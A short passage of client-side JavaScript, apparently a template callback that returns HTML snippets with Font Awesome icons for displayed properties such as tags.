fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
